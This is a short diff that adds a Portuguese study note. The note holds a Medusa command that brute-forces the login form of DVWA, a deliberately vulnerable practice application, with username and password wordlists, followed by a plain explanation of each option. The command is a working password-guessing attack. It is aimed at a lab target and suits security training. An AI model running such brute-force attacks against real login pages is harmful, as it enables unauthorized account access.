@@ -1,0 +1,2 @@
+medusa -h "IP" -u "arquivo de usuarios" -p "arquivo de senhas" -M http \ -m PAGE: '/dvwa/login.php' \ -m FORM 'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6:
+explicação = em ordem cronologica primeiro e ativado o serviço medusa usando os arquivos mencionados logo em seguida é indicado que sera um ataque a um formulario web adiante e passado o endeço do formulario em seguida o corpo para o ataque e finalizando indicando ao medusa qual resposta ele deve esperar para fazer uma nova tentativa.
